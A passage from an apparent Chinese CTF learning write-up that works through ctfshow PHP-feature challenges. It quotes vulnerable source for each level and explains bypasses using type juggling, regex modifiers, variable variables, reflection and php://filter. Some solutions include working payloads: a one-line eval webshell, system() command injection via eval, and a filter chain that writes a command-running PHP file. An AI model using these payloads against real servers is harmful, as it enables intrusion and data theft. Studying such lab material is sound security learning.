9223372036854775807。\n字符串有可能返回 0，虽然取决于字符串最左侧的字符。 使用整型转换的共同规则。\n2.preg_mach()函数preg_match — 执行匹配正则表达式\n语法：\npreg_match(    string $pattern,    string $subject,    array &amp;$matches = null,    int $flags = 0,    int $offset = 0): int|false//搜索subject与pattern给定的正则表达式的一个匹配.\n\n参数：\npattern要搜索的模式，字符串类型。//如果传入的不是字符串类型就会警告并返回falsesubject输入字符串。matches如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。flagsflags 可以被设置为以下标记值的组合：PREG_OFFSET_CAPTURE如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的字节数)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。\n\n返回值：如果 pattern 匹配到指定 subject，则 preg_match() 返回 1，如果没有匹配到则返回 0， 或者在失败时返回 **false**。\n3.题解我们已经把我们不熟悉的函数都了解了，根据源码分析，我们需要绕过正则匹配又需要提交给intval()的是一个数字，正常思维这肯定不可能，于是我们需要利用两个函数的特性\n首先看了题解，我们通过get请求传一个数组过去，由于不是字符串自动警告返回false，然后由于传入数组非空intval()返回1，输出flag\n但是我有点不明白，为什么数组什么都不写也非空\n\n\nget请求传数组\n使用HTTP的GET请求传递数组参数有两种常见的方式：将数组参数以序列化的形式传递和使用方括号语法传递。\n我们用的就是方括号语法传递：\nhttp://example.com/receive.php?fruits[]=apple&amp;fruits[]=banana&amp;fruits[]=cherry  \n\n至于序列化的形式传递数组好难，看不懂，遇到的时候再说\n90关源代码：\ninclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125; \n\n看了源代码，这明显比上一关容易，直接上题解\n1.题解根据特性，我们只需要传入一个数据满足整数为4476，然后有小数即可\n?num=4476.9我们也可以通过不同进制绕过，因为intval($num,0)通过检测 var 的格式来决定使用的进制?num=010574//这里我以0开始，意思就是后面的数字将被以8进制的形式读取\n\n91关show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125; \n\n1.正则表达式一开始就翻车了，也怪我正则表达式没好好学，我就说**^php$**是什么鬼字符串，原来有特殊含义\n一、元字符\n元字符：即为有特定含义的字符，常见的元字符如下\n\n\n\n代码\n说明\n\n\n\n.\n匹配除换行符以外的任意字符\n\n\n\\w\n匹配字母或数字或下划线或汉字\n\n\n\\s\n匹配任意的空白符\n\n\n\\d\n匹配数字\n\n\n\\b\n匹配单词的开始或结束\n\n\n^\n匹配字符串的开始（在集合字符里[^a]表示非（不匹配）的意思\n\n\n$\n匹配字符串的结束\n\n\n也就是说匹配^和$之间的php就行了\n标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。\n下表列出了正则表达式常用的修饰符：\n\n\n\n修饰符\n含义\n描述\n\n\n\ni\nignore - 不区分大小写\n将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。\n\n\ng\nglobal - 全局匹配\n查找所有的匹配项。\n\n\nm\nmulti line - 多行匹配\n使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。\n\n\ns\n特殊字符圆点 . 中包含换行符 \\n\n默认情况下的圆点 . 是匹配除换行符 \\n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \\n。\n\n\n2.题解分析以后，我们直接根据修饰符&#x2F;im和&#x2F;i的区别，只要让php前面多一个回车换行即可，由于回车不被url直接编码，我们输入回车的url形式%0a即可：\n?cmd=%0aphp\n\n92关include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\n这题和90关的区别在于题解一样，但题目不一样\n1.题解我们首先不能输入4476，但整数部分需要为4476，那我们的小数也可以解，然后就是进制解，好像在比较时不会进行进制转换，所以就算不是字符串也能解\n?num=4476.9?num=0x117c//我们GET请求内容传入默认为字符串，没有函数一般不进行进制转换\n\n94关include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\n1.strpos()函数strpos — 查找字符串首次出现的位置\n语法：\nstrpos(string $haystack, string $needle, int $offset = 0): int|false\n\n参数：\nhaystack在该字符串中进行查找。needle要搜索的字符串。Prior to PHP 8.0.0, if needle is not a string, it is converted to an integer and applied as the ordinal value of a character. This behavior is deprecated as of PHP 7.3.0, and relying on it is highly discouraged. Depending on the intended behavior, the needle should either be explicitly cast to string, or an explicit call to chr() should be performed.offset如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。\n\n返回值：返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。 同时注意字符串位置是从0开始，而不是从1开始的。\n如果没找到 needle，将返回 **false**。\n2.题解我们在保证不等于4476和不出现字母的同时需要整数部分为4476且需要出现0且不能为第一个数字，所以不能直接上八进制和十六进制\n4476.0//小数果然还是能用的%0a010574//回车应该也当作字符算\n\n96关highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125;\n\n\n\n这个我首先想到的是用编码flag.php绕过验证，但好像没有地方自动解码\n1.题解 不同路径然后就是我们只需要通过其他路径访问到flag.php就行了\n./flag.php//./为当前目录，../则为上一级目录var/www/html/flag.php//默认路径，但仅限于这题php://filter/resource=flag.php//php伪协议，这次不需要编码，因为后面加了个heghlight_file显示内容\n\n97关include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; \n\n1.md5()函数md5 — 计算字符串的 MD5 散列值\nmd5(string $string, bool $binary = false): string参数 string要计算的字符串。binary如果可选的 binary 被设置为 true，那么 md5 摘要将以 16 字符长度的原始二进制格式返回。    返回值以 32 字符的十六进制数形式返回散列值。md5()内参数如果为数组默认返回1\n\n\n\n2.题解 md5函数特性也就是说，我们要在松散比较时不相等但又必须在md5()编码的情况下严格相等。正常情况肯定不可能，所以我们不能正常的写，89关时也是通过传入规定以外的数组绕过，这次也一样\nmd5()内参数如果为数组默认返回1，我们利用这个\n//由于是POST请求，我们用POST传a[]=1&amp;b[]=2\n\n98关include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; \n\n1.题解 cookie绕过这题看得我有点烦，有点复杂看我仔细分析，感觉提升了我的php水平\n首先，我们得了解三元运算符，当我们有GET请求时，会执行\n$_GET=&amp;$_POST//我们得先知道&amp;这里的作用//作用结果就是把$_GET和$_POST关联起来对$_GET的改动会直接影响到$_POST,相应的$_GET原来的内容会被替换掉\n\n然后就是对$_GET的判断了，由于第一步以后和POST关联了我们只需要持续这个逻辑分析就能判断出\n我们直接看最后\nhighlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);//我们的目的就是让$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;为真，然后就得到flag\n\n方法有好几种\n$_GET为真，POST传HTTP_FLAG=flag//这样的话我们直接跳过那两条判断语句，直接拿flag$_GET为真，POST传flag=flag，我们添加cookie HTTP_FLAG=flag//我们通过cookie来拿flag\n\n\n\n99关highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt;\n\n这里面又突然多了好多不认识的函数\n1.array_push()函数array_push — 将一个或多个单元压入数组的末尾（入栈）\narray_push(array &amp;$array, mixed $value1, mixed $... = ?): intarray输入的数组。value1要压入 array 末尾的第一个值。    返回值返回处理之后数组的元素个数。\n\n2.rand()函数rand() 函数生成随机整数。\n如果您想要一个介于 10 和 100 之间（包括 10 和 100）的随机整数，请使用 rand (10,100)\n3.file_put_contents()函数file_put_contents — 将数据写入文件\nfile_put_contents(    string $filename,    mixed $data,    int $flags = 0,    ?resource $context = null): int|false参数filename要被写入数据的文件名。data要写入的数据。类型可以是 string，array 或者是 stream 资源（如上面所说的那样）。如果 data 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。参数 data 可以是数组（但不能为多维数组），这就相当于 file_put_contents($filename, join(&#x27;&#x27;, $array))。返回值 该函数将返回写入到文件内数据的字节数，失败时返回false\n\n4.题解 php弱类型绕过看完函数以后，又迷茫了，我不知道这些函数有什么用。\n在仔细看题解的时候，遇到了一个让我很纠结的地方，我不理解，去问AI，结果ai的意思就是题目错了，最后是看了ctfshow上面的题解讲到了这里\n首先在经过一个循环以后，$array变为一个有一系列数字的数组，这不是重点。困惑的地方来了，题解说传入n&#x3D;5.php，但是数字数组里面怎么会有.php呢，下面解答\n在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。也就是说我们传进去的是字符串，会被转换为Int，然后.php会在转换的过程中被去掉，所以比较才能继续下去。\n弱类型绕过后，我们直接写入一句话后门即可\nGET: n=5.phpPOST: content=&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n不知道为什么，有时候会出现蚁剑连接不上的情况，而且正常输入命令执行也报错，不知道是不是http和https不同的原因，第二次把https改为http就行了\n100关highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;\n\n1.is_numeric — 检测变量是否是数字或数字字符串()函数\nis_numeric(mixed $value): bool参数value需要检测的变量。返回值 如果 value 是数字或数字字符串， 返回 true，否则返回 false。\n\n不用看了，应该还是利用函数特性，正常使用函数根本不实现不了\n2.题解好吧，我想错了，这不是利用函数特性来解。\n我们先来看下AND OR和&amp;&amp; ||的区别\n\n\n\n结合方向\n运算符\n附加信息\n\n\n\n无\nclone new\nclone 和 new\n\n\n左\n[\narray()\n\n\n右\n++ – ~ (int) (float) (string) (array) (object) (bool) @\n类型和递增／递减\n\n\n无\ninstanceof\n类型\n\n\n右\n!\n逻辑运算符\n\n\n左\n* &#x2F; %\n算术运算符\n\n\n左\n+ – .\n算术运算符和字符串运算符\n\n\n左\n&lt;&lt; &gt;&gt;\n位运算符\n\n\n无\n&#x3D;&#x3D;  !&#x3D;  =&#x3D;&#x3D;  !&#x3D;&#x3D;  &lt;&gt;\n比较运算符\n\n\n左\n&amp;\n位运算符和引用\n\n\n左\n^\n位运算符\n\n\n左\n|\n位运算符\n\n\n左\n&amp;&amp;\n逻辑运算符\n\n\n左\n||\n逻辑运算符\n\n\n左\n? :\n三元运算符\n\n\n右\n&#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; .&#x3D; %&#x3D; &amp;&#x3D; |&#x3D; ^&#x3D; &lt;&lt;&#x3D; &gt;&gt;&#x3D; &#x3D;&gt;\n赋值运算符\n\n\n左\nand\n逻辑运算符\n\n\n左\nxor\n逻辑运算符\n\n\n左\nor\n逻辑运算符\n\n\n左\n,\n多处用到\n\n\n我们可以看见&amp;&amp; ||的运算优先级比&#x3D;高，而and or 的运算优先级比&#x3D;低\n所以我们这题只需要保证v1是数字即可绕过第一层\n然后我们通过v2和v3无；打开ctfshow.php即可\nv2=var_dump v3=;//查看ctfshow,发现就是普通的字符串v2=system(&quot;cat ctfshow.php&quot;)/*&amp;v3=*/;\n\neval(&quot;system(&quot;cat ctfshow.php&quot;);&quot;);//命令执行//执行完后我们没拿到flag,只有$flag_is_62d153f10x2d18030x2d45440x2d8ebc0x2d0cb4813aa7ee//这看来只有解码了，上ai//判断依据：字符串中包含连字符（-）分隔的多个十六进制字符段，符合标准的UUID格式（通常为8-4-4-4-12的分组）。例如，替换字符串中的 0x2d（十六进制ASCII码对应字符 -）后，实际内容为：//62d153f1-1803-4544-8ebc-0cb4813aa7ee，符合UUID的典型结构3。//用途：常用于唯一标识软件、设备或数据实体。//也就是把0x2d换位-\n\n101关highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;\n\n1.反射类正常我们实例化一个类是这样： $News &#x3D; new News\\News();如果我们要实例化News类的反射类是这样：$News &#x3D; new \\ReflectionClass(‘News\\News’);\n通过反射类实例化的类我们可以获取这个这个类的详细信息,可以对类进行分析\nPHP 的反射 API 很多，但是常用的一般都是 ReflectionClass 和 ReflectionMethod:\n反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句\n其属性为类的一个名称，这道题目里面类的名称为ctfshow\n2.题解看见只过滤了(，我还可以为和上题一样但又过滤了注释符和引号，只能看题解了。\n这题使用反射类解决\n?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;eval(&quot;echo new ReflectionClass(&#x27;ctfshow&#x27;);&quot;);\n\n这题没什么特殊的，就是通过反射类来输出类的内容\n870d03cb0x2d3b3a0x2d42960x2dadfd0x2d3575581f530ctfshow&#123;870d03cb-3b3a-4296-adfd-3575581f530&#125;\n\n\n\n102关highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;\n\n\n\n1.call_user_func()call_user_func — 把第一个参数作为回调函数调用\ncall_user_func(callable $callback, mixed ...$args): mixed参数 callback将被调用的回调函数（callable）。args0个或以上的参数，被传入回调函数。    返回回调函数的返回值。\n\n第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。\n也就是第一个参数是函数，其他参数是函数的参数\n2.hex2bin()hex2bin — 转换十六进制字符串为二进制字符串\nhex2bin(string $string): string|false参数 string十六进制表示的数据返回值 返回给定数据的二进制表示 或者在失败时返回 false\n\n3.题解post:v1=hex2binget:v2=225044383959474e6864434171594473    v3=php://filter/write=convert.base64-decode/resource=2.php//由于e在数字中有特殊含义，所以有e也是数字//转换出来就是 &lt;?=`cat *`;\n\n这个题解非常巧妙，甚至可以说得上极端\nhex2bin说的是把16进制转换为2进制，但实际上好像在这题发挥了16进制解码的作用\n我们这个数字很难构造，因为同样的语句在base64加密后即使删除一些base64的符号也不会改变解码的结果，所以进过删减以后才能够先base64在转16进制完成命令执行\n然后我们再通过file_put_contents()函数的特性写入的同时创建文件再访问即可。\n\n\n105关highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);//由于我们输出$suces来获得flag需要post的键值为flag，但那样就和二函数相冲突?&gt;你还想要flag嘛？\n\n1.$$ 符这个符号没有什么特殊的，就是可以把第一个变量的内容作为变量名\n&lt;?php$var = &#x27;hello word !&#x27;;$str = &#x27;var&#x27;;echo $str;echo $$str;?&gt;   //输出结果varhello word !\n\n2.题解这题丢给我绝对想不出的\n由于最后输出的是$error和$suces，但初始值和flag没关系，所以我们要从这里下手\nget:suces=flagpost:error=suces//我们第一个函数得到$suces=$flag//第二个函数得到$error=$suces//最后$error=$suces=$flag\n\n108关highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;?&gt; \n\n\n\n1.ereg()PHP 中的 Ereg() 函数搜索字符串以匹配模式中给出的正则表达式。该函数区分大小写。此函数已在 PHP 5.3.0 中弃用，并在 PHP 7.0.0 中删除\nint ereg ( string $pattern , string $str, array &amp;$arr );\n\n参数：\n\n***pattern:***它是一个区分大小写的常规表达式。\n***str:***它是输入字符串。\n***arr:***它是一个可选输入参数，包含一个由正则表达式中的括号分组的所有匹配表达式组成的数组。\n\n返回值：\n如果找到该模式，该函数将返回 true，否则返回 false。如果在字符串中找到模式匹配，则返回匹配字符串的长度，如果未找到匹配项或发生错误，则返回 false。如果未传递可选参数 arr 或匹配字符串的长度为 0，则该函数返回 1。\n2.strrev()strrev — 反转字符串\nstrrev(string $string): string参数 string待反转的原始字符串。返回值 返回反转后的字符串。\n\n3.题解^[a-zA-Z]+$  正则表达式匹配的是开头结尾都是字母的字符串，也就是全是字母\n36d对应的10进制为877\n//这里我们需要使用截断符来绕过正则匹配c=a%00778//由于是弱类型比较，可以和877比//%00 在php调用c语言库的时候会作为/0对C语言的字符串进行截断，导致正则匹配的时候只能匹配a\n\n109关highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;?&gt; \n\nnew…这是php中使用类的语法，所以这题用类解，自己肯定做不出\n1.Exception::__toString这个介绍太多了，属于php自带的类，\nException是所有用户级异常的基类。里面包含的各种方法课可以获取异常情况\nException::toString则是调用类中的方法\nException::__toString — 将异常对象转换为字符串\n&lt;?phptry &#123;    throw new Exception(&quot;Some error message&quot;);&#125; catch(Exception $e) &#123;    echo $e;&#125;?&gt;\n\n输出结果\nexception &#x27;Exception&#x27; with message &#x27;Some error message&#x27; in /home/bjori/tmp/ex.php:3Stack trace:#0 &#123;main&#125;\n\n会输出异常的各种对象，我们也引发异常即可，\n2.题解v1=exception&amp;v2=system(ls)//这样eval不会报错\n\n\n\n我们把输入带入\neval(&quot;echo new exception(system(ls)());&quot;);\n\n先是执行system(ls)-&gt;exception(fl36dg.txt index.php())把返回值作为函数名使用，这明显是个异常的函数-&gt;exception返回异常函数名-&gt;输出\nv1=exception&amp;v2=phpinfo//就会变成 eval(&quot;echo new exception(phpinfo());&quot;);\n\n\n\n//这题我们也可以直接闭合和注释rce,但那就和普通题目一样了v1=Exception();system(&quot;ls&quot;);//&amp;v2=aeval(&quot;echo new Exception();system(&quot;ls&quot;);//(a());&quot;);//这样也可以吗，为什么我看不太懂\n\n110关highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125; \n\n看见eval()就知道这也是一个内置类的题目\n1.FilesystemIterator()我服了，为什么php手册还有全英的\n这也是一个内置类，有很多其他方法，但我们只需要使用其中_tostring即可\n当 FilesystemIterator 对象在需要转换为字符串的上下文中使用时，会调用其底层关联的 SplFileInfo 对象的 __toString() 方法。本质上，它返回当前迭代项（文件或目录）的完整路径名。\n&lt;?php // 指定要遍历的目录路径 $directory = __DIR__;  // 创建 FilesystemIterator 对象 $iterator = new FilesystemIterator($directory);  // 遍历目录中的文件和子目录 foreach ($iterator as $fileinfo) &#123;     // 直接将 FilesystemIterator 当前项当作字符串使用，会调用 __toString() 方法     echo $fileinfo. PHP_EOL; &#125; ?&gt; \n\n2.getcwd()我们用类可以通过路径返回当前目录文件，但过滤掉了下划线，我们无法用魔术方法也无法写路径，这时候就需要getcwd()函数\ngetcwd() 是 PHP 中的一个内置函数，用于获取当前工作目录的绝对路径。这个函数没有任何参数，直接调用即可\n3.题解//我们直接用类返回当前目录文件v1=FilesystemIterator v2=getcwd\n\n\n\n111关highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt; \n\n这个题目又是过滤得差不多只剩字母了，也是看题解\n1.php引用符&amp;看得我头麻了，一开始我以为这和C语言里面的取地址符一样，看来我还是太年轻了，PHP这么高级的语言这么还需要取地址(doge)\n和C语言主要不同的是C语言是把地址取出来用，而PHP则是一种类似于绑定的关系，实际上不会返回地址\n通过引用符 &amp; 可以让两个变量指向同一个内存地址，对其中一个变量的修改会影响到另一个变量。\n我们来解释一下题目\nfunction getFlag(&amp;$v1,&amp;$v2)&#123;//绑定实参和形参，形参改变实参也会改变    eval(&quot;$$v1 = &amp;$$v2;&quot;);//绑定$$v1和$$v2，值也相同    var_dump($$v1);//由于$$v1=&amp;$$v2,所以var_dump($$v1)=var_dump($$v2)&#125;\n\n2.超全局变量GLOBALSPHP中的$GLOBALS是一个超级全局变量组，它在一个PHP脚本的全部作用域中都可以访问。这个变量实际上是一个包含了全部变量的全局组合数组，其中变量的名字就是数组的键1。$GLOBALS的主要用途是在函数内部访问全局变量，而不需要使用global关键字。\n\n\n我们可以看到，我们可以直接通过GLOBALS访问到其他变量\n3.题解加入我们传入\nv1=ctfshow&amp;v2=flag虽然结果最后会变为var_dump($flag)但$flag未通过参数传入，导致为null这时候就需要使用到刚才提到的超全局变量，可以访问所有变量\n\nv1=ctfshow&amp;v2=GLOBALS\n\n\n\n112关highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125; \n\n这题比较简单，就是过滤绕过即可，主要还是介绍一下is_file()函数\n1.is_file()is_file — 判断给定文件名是否为一个正常的文件\nis_file(string $filename): bool判断指定文件名是否为正常的文件。如果 filename 是符号链接，将会解析符号链接并提供有关所引用文件的信息。参数filename文件的路径。返回值 如果文件存在且为正常的文件则返回 true，否则返回 false。\n\n这题在Is_file前面加了个!，也就是我们传进去的不能是个正常的文件，然后过滤条件也直指payload就是php伪协议，我们直接绕过\nfile=php://filter/convert/resource=flag.php\n\n由于base64被过滤掉了，php:&#x2F;&#x2F;filter无过滤器，导致直接读取flag.php文件(但is_file()不判定其为正常文件)，然后被高亮得到flag.php\n115关include(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125; hacker!!!\n\n现在有点烦了，我学C语言时见都没见过这么多函数，\n1.trim()trim — 去除字符串首尾处的空白字符（或者其他字符）\ntrim(string $string, string $characters = &quot; \\n\\r\\t\\v\\x00&quot;): string\n\n此函数返回字符串 string 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符：\n\n&quot; &quot;： ASCII SP 字符 0x20，一个普通的空格。\n&quot;\\t&quot;： ASCII HT 字符 0x09，一个制表符。\n&quot;\\n&quot;： ASCII LF 字符 0x0A，一个换行符。\n&quot;\\r&quot;： ASCII CR 字符 0x0D，一个回车符。\n&quot;\\0&quot;： ASCII NUL 字符 0x00，一个 NUL 字节。\n&quot;\\v&quot;： ASCII VT 字符 